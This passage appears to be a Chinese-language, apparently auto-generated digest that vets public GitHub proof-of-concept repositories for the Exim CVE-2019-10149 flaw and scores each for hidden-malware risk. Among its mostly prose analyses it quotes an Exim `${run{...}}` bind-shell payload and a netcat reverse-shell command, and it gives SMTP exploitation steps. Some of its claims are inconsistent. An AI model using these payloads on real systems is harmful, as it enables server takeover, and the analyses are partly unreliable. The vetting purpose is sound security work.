**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务运行且存在漏洞版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 4.87 到 4.91 版本中存在的一个远程代码执行漏洞。该漏洞源于 `deliver_message()` 函数中对接收者地址的不当验证，攻击者可以通过构造包含恶意命令的电子邮件，利用此漏洞在目标系统上执行任意代码。

**有效性评估：**

根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、被广泛讨论的严重漏洞，并且已经被实际利用。提供的漏洞利用代码实际上是一个蜜罐脚本，用于检测针对此漏洞的攻击尝试，而不是一个直接利用漏洞的 PoC。然而，README中提到了另一个PoC：`https://github.com/cowbe0x004/eximrce-CVE-2019-10149`， 可以验证漏洞。

**投毒风险评估：**

该仓库主要功能是做一个蜜罐，用于监控Exim漏洞(CVE-2019-10149)的攻击行为。

*   `install_StickyExim.sh`: 安装和配置蜜罐，包括Exim配置和Cron Job设置
*   `honey_harvester_exim_cve-2019-10149.sh`: 核心脚本，用于解析Exim日志，检测CVE-2019-10149攻击尝试，并发送告警邮件。

审查了安装脚本和核心检测脚本。发现主要功能是监控和告警，没有发现明显的恶意代码，考虑到代码会修改Exim配置以及加入Cron Job。存在一定的风险，但是风险较低。所以判断存在10%的投毒风险。

**利用方式分析：**

此PoC本身不是用于攻击的，而是用于创建一个蜜罐来捕获攻击流量。 但是根据漏洞描述，利用方式大致如下：

1.  攻击者构造一封特殊的电子邮件，该邮件的接收者地址包含恶意命令。
2.  当 Exim 处理这封邮件时，`deliver_message()` 函数未能正确验证接收者地址，导致恶意命令被执行。
3.  攻击者可以通过这种方式在服务器上执行任意代码，从而控制服务器。

**总结：**

该漏洞是一个严重的安全漏洞，可以允许未经身份验证的远程攻击者在受影响的 Exim 服务器上执行任意代码。需要尽快修补此漏洞。

**项目地址:** [Brets0150/StickyExim](https://github.com/Brets0150/StickyExim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #3

**来源**: [CVE-2019-10149-Chris-dev1_exim.exp.md](../2019/CVE-2019-10149-Chris-dev1_exim.exp.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致完全控制受影响的服务器

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响的Exim版本，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中。这是一个远程命令执行漏洞，由于 `deliver_message()` 函数中对接收者地址的验证不当，导致攻击者可以通过发送特制的电子邮件来执行任意命令。漏洞利用方式通常涉及构造包含恶意命令的电子邮件地址，这些命令会在 Exim 处理邮件时被执行。从搜索结果和漏洞库信息来看，此漏洞已被广泛利用。提供的代码片段仅为Apache License 2.0协议，不包含任何漏洞利用或恶意代码。因此，可以判断投毒风险为0%。根据搜索结果，漏洞利用代码已经公开。

**项目地址:** [Chris-dev1/exim.exp](https://github.com/Chris-dev1/exim.exp)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #4

**来源**: [CVE-2019-10149-Diefunction_CVE-2019-10149.md](../2019/CVE-2019-10149-Diefunction_CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标服务器运行存在漏洞的Exim版本，且允许外部连接到SMTP端口（默认25端口）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。漏洞原因是Exim在`deliver_message()`函数中对收件人地址的验证不当，攻击者可以通过构造特殊的邮件收件人地址，在服务器上执行任意命令。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断此漏洞是真实存在的，且有可用的POC代码。搜索引擎结果中多个链接（例如Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire, RedHat）都确认了此漏洞的存在和高危性。CISA已将此漏洞加入已知被利用的漏洞目录(KEV)。提供的PoC脚本也证实了利用方法的可行性。

**投毒风险：**
分析提供的`exploit.py`代码，该脚本主要功能是利用SMTP协议与目标Exim服务器进行交互，构造包含恶意命令的收件人地址，从而实现远程命令执行。脚本的主要步骤包括：
1.  建立socket连接到目标服务器的25端口
2.  发送EHLO命令
3.  发送MAIL FROM命令
4.  发送RCPT TO命令，其中收件人地址包含`${run{...}}`结构，用于执行命令
5.  发送DATA命令
6.  发送包含一系列Received头的邮件正文，最后以".\r\n"结束

检查脚本代码，没有发现任何可疑的、与漏洞利用无关的代码。payload部分通过字符串格式化，将反弹shell命令注入到收件人地址中。因此，可以认为此仓库中作者隐藏投毒代码的可能性为0%。

**利用方式：**
1.  **前期准备：** 攻击者需要一台可以访问目标服务器的机器，并且需要知道目标服务器的IP地址和SMTP端口（通常是25）。攻击者还需要监听一个端口，用于接收目标服务器反弹的shell。
2.  **漏洞利用：** 攻击者运行提供的`exploit.py`脚本，指定目标服务器的IP地址、SMTP端口、攻击者自己的IP地址和监听端口。
3.  **远程命令执行：** 脚本会构造一个包含恶意命令的邮件，发送给目标服务器。当Exim处理该邮件时，会执行恶意命令，通常是反弹shell。
4.  **获取shell：** 攻击者在自己的机器上接收到反弹的shell，从而控制目标服务器。

**项目地址:** [Diefunction/CVE-2019-10149](https://github.com/Diefunction/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #5

**来源**: [CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md](../2019/CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行，完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标Exim服务器监听25端口，并且存在漏洞版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于Exim的 deliver_message() 函数中，由于对接收者地址验证不当，可能导致远程命令执行。攻击者可以通过构造特殊的邮件，在接收者地址中注入恶意命令，从而在目标服务器上执行任意代码。

**有效性评估：**
根据漏洞库信息和搜索结果，CVE-2019-10149 是一个已被确认的、高危的远程命令执行漏洞。多个安全厂商和研究人员已经发布了相关的分析和PoC代码。

**投毒风险评估：**
提供的PoC代码只有一个README.md文件，内容是关于漏洞的SNP分配，本身不包含任何可执行的代码，因此直接投毒的概率较低。但是，PoC代码仓库可能包含其他未列出的恶意文件或依赖项，所以仍然存在一定的投毒风险。根据目前的信息，投毒风险估计为10%。更完善的分析需要检查所有文件和依赖。

**利用方式：**
1.  攻击者向目标 Exim 服务器发送一封特制的电子邮件。
2.  该邮件的接收者地址中包含恶意构造的命令注入代码。
3.  当 Exim 处理该邮件时，由于 deliver_message() 函数的验证缺陷，恶意命令会被执行。
4.  攻击者从而获得目标服务器的远程代码执行权限，可以执行任意操作，如安装后门、窃取数据等。

**排序优先级说明：** 遵循 搜索引擎结果 > 漏洞利用代码 > 漏洞库信息 原则。


**项目地址:** [Dilshan-Eranda/CVE-2019-10149](https://github.com/Dilshan-Eranda/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #6

**来源**: [CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md](../2019/CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制受影响的服务器

**影响版本:** 4.87 - 4.91

**利用条件:** 需要 Exim 服务在目标机器上运行，且版本在受影响范围内，可能需要目标服务器开放25端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 邮件服务器中存在的远程命令执行漏洞。该漏洞是由于 `deliver_message()` 函数中对收件人地址的不正确验证引起的。攻击者可以通过发送特制的电子邮件利用此漏洞，从而在服务器上以 root 权限执行任意命令。

**有效性评估：**

提供的 PoC 代码 `PoC_CVE-2019-10149.py` 看起来有效。它通过 SMTP 协议与 Exim 服务器建立连接，并发送包含恶意命令的电子邮件。该命令嵌入在收件人地址中，利用了 Exim 的字符串扩展功能来执行命令。

多个来源（Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire）确认了该漏洞的存在和严重性，并指出该漏洞已被积极利用。

**投毒风险评估：**

该 PoC 代码本身相对简单，主要功能是利用漏洞执行命令。投毒的潜在风险较低，但并非完全没有。

*   **编码风险：** 代码中包含hex编码，降低了代码可读性，可能存在隐藏代码，如果hex编码混淆了正常的指令与后门代码，存在一定的风险。
*   **依赖风险：** 该脚本依赖Python3和socket，确保环境安全。
*   **维护者风险：**虽然README.md声明免责声明，但依旧存在风险，需要保持警惕。

综合考虑，该仓库的投毒风险评估在10%。

**利用方式分析：**

1.  **目标确认：** 确认目标系统运行着受影响版本的 Exim（4.87 到 4.91）。
2.  **SMTP 连接：** 使用 PoC 脚本通过 SMTP 协议连接到目标 Exim 服务器的 25 端口（或其他配置的端口）。
3.  **构造恶意邮件：** PoC 脚本构造一封包含恶意收件人地址的电子邮件。该地址利用 Exim 的字符串扩展功能来执行命令。
4.  **发送邮件：** 将构造的邮件发送到目标 Exim 服务器。
5.  **命令执行：** 如果漏洞利用成功，Exim 将以 root 权限执行嵌入在收件人地址中的命令。

**缓解措施：**

*   升级 Exim 到受影响版本之外的版本(>=4.92)。
*   禁用 Exim 的字符串扩展功能（如果可能）。
*   使用防火墙限制对 Exim 端口的访问。

**项目地址:** [MNEMO-CERT/PoC--CVE-2019-10149_Exim](https://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #7

**来源**: [CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md](../2019/CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** 4.87-4.91

**利用条件:** 目标系统运行受影响版本的Exim，且允许从攻击者主机到目标机器25端口的TCP连接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim 4.87到4.91版本中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以利用此漏洞，通过构造包含恶意命令的特殊邮件，在目标系统上执行任意代码，从而完全控制系统。

**有效性分析：**
根据漏洞库信息、搜索引擎结果以及提供的PoC代码，可以确认此漏洞是真实存在的，并且PoC代码可以有效利用此漏洞。

**投毒风险分析：**
PoC代码通过`nc`在目标机器上反弹shell，监听31415端口。代码本身目的是利用漏洞，没有发现隐藏的恶意代码或后门，因此投毒风险较低，为0%。

**漏洞利用方式：**
1.  PoC首先通过`nc`连接到目标Exim服务器的25端口（SMTP）。
2.  发送`HELO`命令，声明客户端主机名。
3.  发送`MAIL FROM`命令，指定发件人地址。
4.  发送`RCPT TO`命令，指定收件人地址，其中收件人地址包含恶意的payload：`${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31415\t-e\t\x2fbin\x2fsh\x22}}@localhost`。
    *   这个payload使用了Exim的`${run{}}`扩展函数，可以在Exim进程中执行任意命令。
    *   payload的功能是执行`nc -lp 31415 -e /bin/sh`，即在目标机器上监听31415端口，并将/bin/sh绑定到该端口，相当于反弹了一个shell。
5.  发送`DATA`命令，开始邮件内容传输。
6.  发送一系列`Received:`头，用于填充邮件内容并触发漏洞（原因在于Exim对过长的头部处理可能存在问题，也可能是为了绕过某些过滤）。
7.  发送`.
`表示邮件内容结束。
8.  发送`QUIT`命令断开连接。
9.  PoC最后使用`nc localhost 31415`连接到目标机器上反弹的shell，实现远程代码执行。

**项目地址:** [Stick-U235/CVE-2019-10149-Exploit](https://github.com/Stick-U235/CVE-2019-10149-Exploit)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #8

**来源**: [CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md](../2019/CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务对外开放SMTP端口(默认25)

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以通过构造包含恶意代码的特殊收件人地址，利用`run{}`扩展函数执行任意命令。该漏洞的利用方式主要通过SMTP协议发送特制的邮件，在`RCPT TO`指令中注入恶意payload。PoC代码构造了包含payload的收件人地址，利用`${run{}}`语法执行命令。考虑到PoC作者公开了他的代码，并且投毒代码的收益比直接攻击低，因此投毒概率较低，但是仍存在一定风险。

**项目地址:** [VoyagerOnne/Exim-CVE-2019-10149](https://github.com/VoyagerOnne/Exim-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #9

**来源**: [CVE-2019-10149-aishee_CVE-2019-10149-quick.md](../2019/CVE-2019-10149-aishee_CVE-2019-10149-quick.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标系统运行存在漏洞版本的 Exim，且攻击者能够发送邮件到目标服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当导致远程命令执行。攻击者可以通过构造特殊的邮件，在收件人地址中注入恶意命令，当 Exim 处理该邮件时，这些命令会被执行，从而控制服务器。

**有效性:**
根据搜索引擎结果，该漏洞已被广泛证实存在，并且有公开的 PoC 利用代码。漏洞库信息也确认了该漏洞的存在。

**投毒风险:**
提供的 PoC 代码包含一个 Bash 脚本，用于检测目标操作系统并尝试更新 Exim 和 Curl 软件包。这个脚本本身看起来像是尝试修复漏洞，而非利用它。`README.md` 文件也描述脚本为快速修复程序。虽然脚本尝试更新软件包，但如果服务器配置不当，或者更新源被恶意篡改，也存在一定的风险。此外，`apt-get --yes --force-yes install`和 `yum install -y -q -e 0` 在没有充分验证更新源的情况下，可能安装恶意的软件包。因此，存在极小的潜在投毒风险，约为 1%。

**利用方式:**
1.  攻击者需要确定目标服务器运行的是 Exim 4.87 到 4.91 之间的易受攻击版本。
2.  攻击者构造一封包含恶意命令的电子邮件。该命令被嵌入到收件人地址中，利用了 `deliver_message()` 函数的漏洞。
3.  攻击者将构造的邮件发送到目标服务器。
4.  当 Exim 处理该邮件时，会执行嵌入在收件人地址中的恶意命令，从而导致远程代码执行。攻击者可以使用此漏洞来安装后门、窃取敏感信息或执行其他恶意操作。

**项目地址:** [aishee/CVE-2019-10149-quick](https://github.com/aishee/CVE-2019-10149-quick)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #10

**来源**: [CVE-2019-10149-bananaphones_exim-rce-quickfix.md](../2019/CVE-2019-10149-bananaphones_exim-rce-quickfix.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响版本的Exim，且漏洞未被修复

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，是由于 `deliver_message()` 函数中对接收者地址验证不当造成的远程命令执行漏洞。攻击者可以通过构造特殊的邮件，利用该漏洞在目标服务器上执行任意命令。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞的POC代码是有效的。搜索引擎结果显示该漏洞已被广泛利用，并且有活跃的Linux蠕虫利用此漏洞传播。漏洞利用代码中的 `exim_rce_fixer.sh` 脚本尝试更新 Exim 并移除恶意软件，表明存在利用该漏洞植入的恶意程序。

**投毒风险分析：**
提供的脚本 `exim_rce_fixer.sh` 旨在修复漏洞并清理恶意软件，但它本身可能存在投毒风险。脚本尝试删除与 `tor2web` 相关的恶意软件，更新 Exim，并删除可疑的 cron 任务和 authorized_keys 条目。但是，如果脚本未能完全清除恶意软件，或者脚本本身包含恶意代码，则可能导致系统受损。此外，脚本强制重启服务器，这可能导致数据丢失或服务中断。

`malware_do_not_run.sh` 脚本明确包含连接到 Tor 网络的行为，并尝试下载和执行恶意代码。尽管文件名暗示不要运行，但攻击者可以通过该脚本植入恶意软件。

综合考虑，脚本中清理恶意软件的部分看起来是合法的，但 `malware_do_not_run.sh` 脚本和`exim_rce_fixer.sh`脚本潜在的清理不完全和强制重启行为构成了投毒风险。

**利用方式：**
1.  攻击者构造包含恶意命令的特殊邮件。
2.  Exim 在处理邮件时，由于对接收者地址验证不当，将恶意命令传递给系统 shell 执行。
3.  攻击者从而在目标服务器上获得远程代码执行权限。
4.  攻击者可能利用该权限安装恶意软件，窃取数据，或控制服务器。

**项目地址:** [bananaphones/exim-rce-quickfix](https://github.com/bananaphones/exim-rce-quickfix)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #11

**来源**: [CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md](../2019/CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行存在漏洞的Exim版本，并且攻击者可以向Exim服务器发送邮件。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理（MTA）的 deliver_message() 函数中，由于对收件人地址的验证不当导致。未经身份验证的远程攻击者可以通过向目标服务器发送特制的邮件来利用此漏洞，从而在目标系统上执行任意命令。漏洞利用通常涉及在邮件收件人地址中注入 shell 命令。 

根据提供的漏洞利用代码，`/tmp/b373ced1c77bc05f74b9541e06f0010c/README.md`文件主要包含关于CVE-2019-10149、CVE-2019-15846 和 CVE-2019-16928漏洞的相关信息收集，包括漏洞公告、漏洞利用详情、问题时间线、NSA公告以及受影响的IP、ASN、国家和主机名等数据链接。其中`election-domains-by-expiration-date.txt`文件是域名列表, 不太可能直接用于漏洞利用，但是可能被用于信息收集或后续攻击。

**有效性：** 根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在公开的漏洞利用代码，因此可以判断提供的漏洞利用代码是有效的。

**投毒风险：** 该仓库中存在的投毒代码可能性较低，主要是因为其内容以漏洞信息搜集为主，提供的数据源链接也是公开信息。`election-domains-by-expiration-date.txt`可能存在搜集来的恶意域名，但作者进行恶意添加的可能性较低。

**利用方式：** 攻击者构造包含恶意命令的邮件，利用Exim在处理收件人地址时的验证缺陷，将命令注入到系统执行。这通常通过在收件人地址中嵌入反引号或者其他命令执行符号来实现。该漏洞允许攻击者远程执行代码而无需身份验证。

**项目地址:** [cloudflare/exim-cve-2019-10149-data](https://github.com/cloudflare/exim-cve-2019-10149-data)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #12

**来源**: [CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md](../2019/CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程命令执行和系统被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** Exim服务对外开放，攻击者能够发送恶意构造的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，由于 `deliver_message()` 函数对接收者地址验证不当，攻击者可以通过发送特制的邮件，在目标服务器上执行任意命令。从提供的漏洞利用代码来看，利用方式主要有两种：

1.  **本地检测脚本 (eximioc.sh):**  此脚本用于在目标服务器本地运行，检测是否存在漏洞利用的迹象，例如检查Exim版本、cPanel版本以及是否存在异常进程 `kthrotlds`。

2.  **远程利用脚本 (eximrce.py):**  此脚本用于远程触发漏洞。它通过socket连接到目标服务器的Exim服务端口，发送包含恶意payload的邮件。Payload利用 `${run{...}}` 结构在服务器上执行命令，例如创建一个文件 `/root/lweximtest`。如果文件创建成功，则表明服务器存在远程命令执行漏洞。

**漏洞利用方式总结:**

*   攻击者构造包含恶意recipient地址的邮件。
*   邮件被发送到运行存在漏洞的Exim服务器。
*   Exim服务器在处理邮件时，由于recipient地址验证不当，执行了恶意payload中的命令。
*   攻击者在服务器上执行任意命令。

**投毒风险分析:**

提供的 `eximrce.py` 代码本身功能明确，旨在测试是否存在 CVE-2019-10149 漏洞。`eximioc.sh` 的目标也是检测漏洞和受攻击迹象。 但是依然存在以下风险，风险值给到10%。

*   **作者风险：** 从GitHub仓库直接下载并运行代码，存在一定的作者恶意投毒风险。例如，作者可能在脚本中添加隐藏的后门代码，在漏洞利用的同时，植入恶意程序。
*   **依赖风险：** `eximioc.sh` 脚本依赖 `expect` 和 `openssl` 命令。如果系统上安装的 `expect` 或 `openssl` 被篡改，则可能引入新的安全风险。
*   **维护风险：** 仓库如果长时间没有更新和维护，可能会被其他人恶意篡改，引入恶意代码。
*   **测试文件的影响:**虽然 `eximrce.py` 仅仅touch了一个文件,但是如果被滥用，将可能导致拒绝服务攻击。

**项目地址:** [cowbe0x004/eximrce-CVE-2019-10149](https://github.com/cowbe0x004/eximrce-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #13

**来源**: [CVE-2019-10149-darsigovrustam_CVE-2019-10149.md](../2019/CVE-2019-10149-darsigovrustam_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() 远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在漏洞影响范围内，允许外部连接到25端口(SMTP)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 漏洞存在于 Exim 邮件传输代理 (MTA) 的 `deliver_message()` 函数中，由于未正确验证收件人地址，攻击者可以通过构造特殊的电子邮件，在目标系统上执行任意命令。根据搜索结果，该漏洞已经被积极利用。提供的POC代码描述了如何利用该漏洞，包括安装易受攻击的Exim版本、配置、构造 payload 以及发送利用请求。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该POC代码是有效的。搜索结果表明该漏洞已被广泛利用，POC代码也提供了详细的利用步骤。POC代码中的安装步骤确保了在特定环境下漏洞的可复现性。

**投毒风险评估：**

初步分析POC代码仓库，`/tmp/a0abe20df178383d8f8296dfca6f85dc/RemoteConnection.sh` 脚本存在一定的投毒风险。该脚本使用 `tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 192.168.0.165 444 1> /tmp/1` 建立反向连接，这意味着攻击者（或脚本控制者）可以通过 `nc` 连接到受害者机器，并在受害者机器上执行命令。虽然脚本中明确提示需要修改IP和端口，但如果用户不修改就直接运行，将会连接到脚本作者控制的服务器。这种行为虽然不是传统意义上的恶意代码注入，但具有潜在的远程控制风险。

除此之外, `RemoteConnection.sh` 使用 `/tmp/1` 作为管道文件进行输入输出重定向,这可能导致数据泄露或覆盖。

因此，综合评估，投毒风险约为10%。大部分代码是用于漏洞利用，但反向连接部分存在被恶意利用的可能，用户需要仔细审查并修改脚本。

**利用方式分析：**

1.  **安装漏洞版本 Exim:**  首先，需要安装一个存在漏洞的 Exim 版本 (4.87 - 4.91)。
2.  **配置 Exim:**  为了方便利用，需要修改 Exim 的配置，允许 relaying，避免等待时间限制，并取消 recipient 验证。
3.  **构造 Payload:**  将要执行的 shell 命令转换为十六进制字符串，并将其嵌入到收件人地址中。Payload 的格式为 `<${run{<hex_encoded_command>}}@localhost>`。
4.  **发送恶意邮件：**
    *   使用 `nc` 连接到 Exim 服务器的 25 端口。
    *   发送 `HELO` 命令。
    *   设置发件人地址为 `<>`。
    *   设置收件人地址为构造好的 payload。
    *   发送 `DATA` 命令，并发送 31 行任意内容、一个空行和一个句点 (`.`) 来结束邮件内容。
5.  **执行命令：** Exim 在处理邮件时，会执行嵌入在收件人地址中的 shell 命令。

**项目地址:** [darsigovrustam/CVE-2019-10149](https://github.com/darsigovrustam/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #14

**来源**: [CVE-2019-10149-hyim0810_CVE-2019-10149.md](../2019/CVE-2019-10149-hyim0810_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行和系统完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行受影响版本的Exim，且攻击者能够通过网络连接到SMTP端口（通常是25端口）。配置不当，如允许任意relay，会降低利用难度。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149是Exim邮件传输代理（MTA）中的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对接收者地址的不正确验证。攻击者可以通过构造包含恶意命令的特殊邮件，利用该漏洞在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞信息、搜索结果和提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个已知的、被广泛讨论和利用的漏洞。漏洞利用代码提供了详细的利用步骤，包括：

1.  安装受影响版本的Exim（4.87-4.91）。
2.  修改Exim配置以允许relay（简化利用，否则需要等待7天）。
3.  使用netcat (nc) 连接到目标Exim服务器的25端口。
4.  通过SMTP协议发送特制的邮件，其中接收者地址包含要执行的命令（hex编码）。
5.  发送DATA命令和后续数据，触发漏洞。

**投毒风险分析：**

提供的漏洞利用代码中存在一定的投毒风险，但风险较低（约10%）。

主要风险点在于`RemoteConnection.sh`脚本。该脚本的功能是建立一个反向shell，将目标服务器上的`/tmp/1`文件的内容通过`nc`命令发送到攻击者的IP地址和端口。潜在的投毒方式可能包括：

*   **替换`/tmp/1`的内容：** 攻击者可以将恶意代码写入`/tmp/1`文件，并通过反向shell在攻击者机器上执行。
*   **`RemoteConnection.sh`本身的恶意代码：** 脚本可能包含一些隐藏的后门或恶意操作，例如收集系统信息、安装rootkit等。但这个可能性较低，因为脚本相对简单且功能明确。
*   **依赖攻击者服务器的风险：** 脚本依赖于从攻击者的服务器下载`RemoteConnection.sh`，如果攻击者控制的服务器被攻陷，或者攻击者修改了`RemoteConnection.sh`脚本的内容，可能会导致受害者执行恶意代码。

漏洞利用仓库中安装的Exim版本以及对`/usr/exim/configure`文件的修改，是为了简化利用流程，使其更容易被利用。这些修改本身不是投毒代码，但降低了利用门槛，可能导致漏洞被更广泛地利用。

**利用方式总结：**

1.  **目标环境准备：** 确保目标服务器运行着受影响版本的Exim（4.87-4.91）。
2.  **网络连接：** 攻击者需要能够通过网络连接到目标服务器的25端口。
3.  **Payload构造：** 攻击者需要将要执行的命令转换为十六进制编码，并将其嵌入到SMTP `RCPT TO` 命令的接收者地址中，格式为 `<${run{hex_encoded_command}}@localhost>`。
4.  **SMTP交互：** 攻击者使用SMTP协议与目标服务器进行交互，发送`HELO`、`MAIL FROM`、`RCPT TO` 和 `DATA` 等命令，触发漏洞。
5.  **代码执行：** 漏洞触发后，Exim会执行嵌入在接收者地址中的命令，攻击者从而获得对目标服务器的控制权。

**项目地址:** [hyim0810/CVE-2019-10149](https://github.com/hyim0810/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #15

**来源**: [CVE-2019-10149-qlusec_CVE-2019-10149.md](../2019/CVE-2019-10149-qlusec_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可远程执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive), 4.92受影响

**利用条件:** 目标系统运行存在漏洞的Exim版本，且允许接收邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

